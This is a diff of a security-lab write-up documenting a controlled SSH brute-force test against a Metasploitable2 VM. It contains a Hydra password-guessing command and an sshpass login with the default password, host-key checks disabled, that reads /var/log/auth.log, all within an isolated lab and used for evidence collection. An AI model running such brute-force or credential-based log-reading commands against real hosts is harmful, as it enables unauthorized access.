@@ -102,17 +102,18 @@ sudo tcpdump -i eth0 -w ~/Downloads/ssh_bruteforce.pcap tcp port 22
 ```
 
 ### 4) Controlled SSH authentication test (Hydra) — observed host-key error
+Used Hydra command: `sudo hydra -l msfadmin -P ~/Documents/lab-home/small_wordlist.txt ssh://192.168.56.3 -t 4 -f -o ~/Downloads/hydra_ssh_out.txt -V`. Hydra failed with `kex error : no match for method server host key algo: server [ssh-rsa,ssh-dss], client [ssh-ed25519,ecdsa-sha2-...]` this indicates a host-key algorithm mismatch: Metasploitable (old OpenSSH) advertises legacy host-key types that modern clients may reject by default. Saved `hydra_ssh_out.txt` as evidence of the attempt and error.
 
 ```bash
 sudo hydra -l msfadmin -P ~/Documents/lab-home/small_wordlist.txt \
   ssh://192.168.56.3 -t 4 -f -o ~/Downloads/hydra_ssh_out.txt -V
 ```
 
-If you see a *kex* / host-key algorithm mismatch (modern client vs legacy server), Hydra/ssh may fail. Save `hydra_ssh_out.txt` as evidence.
-
-### 5) Controlled workaround & remote auth log extraction
-
-Use `sshpass` with explicit host-key options **only** in this isolated lab to fetch auth logs for correlation:
+### 5) Controlled workaround & remote auth log extraction (Kali)
+Because modern tools may reject old host keys, used `sshpass` with explicit options in this isolated lab to fetch auth logs for correlation:  
+`mkdir -p ~/Downloads/lab_evidence_metasploitable`  
+`sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.56.3 'sudo tail -n 120 /var/log/auth.log' > ~/Downloads/lab_evidence_metasploitable/auth_log_snippet.txt`  
+This saves `auth_log_snippet.txt` locally; it contains recent `sshd` and `sudo` entries to correlate with the pcap. Note: `sshpass` and the `ssh` options are used here only in an isolated controlled environment. Do not expose credentials or secrets in public repos.
 
 ```bash
 mkdir -p ~/Downloads/lab_evidence_metasploitable
@@ -125,8 +126,7 @@ sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no \
   msfadmin@192.168.56.3 'sudo tail -n 120 /var/log/auth.log' \
   > ~/Downloads/lab_evidence_metasploitable/auth_log_snippet.txt
 ```
-
-**Security note:** do not commit secrets; collect only necessary log snippets and rotate/revoke any tokens used.
+**Security note:** do not commit secrets; collected only necessary log snippets and rotate/revoke any tokens used.
 
 ### 6) Apply temporary mitigation (on Metasploitable2)
 
